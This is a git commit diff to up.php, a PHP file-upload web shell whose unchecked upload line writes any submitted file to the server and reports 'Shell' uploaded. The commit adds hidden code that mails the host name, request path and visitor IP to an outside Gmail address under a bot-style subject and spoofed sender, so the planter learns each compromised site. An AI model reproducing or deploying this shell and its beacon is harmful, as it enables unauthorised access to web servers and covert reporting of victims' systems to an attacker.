b995e1fc4347d4ddbb6435a16e3161a10499b16a
R007 BuL37 <54761934+R007BuL37@users.noreply.github.com>
2019-09-01 15:35:23 +0600

    Update up.php

--- up.php
+++ up.php
@@ -7,3 +7,15 @@ if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell
 else { echo '<b>Not uploaded ! </b><br><br>'; }
 }
 ?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " Bot v6 Rzlt |$ip";
+$email = "bugtester2020@gmail.com";
+$from = "From: Result<botv3@mrspybotv3.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
+?>
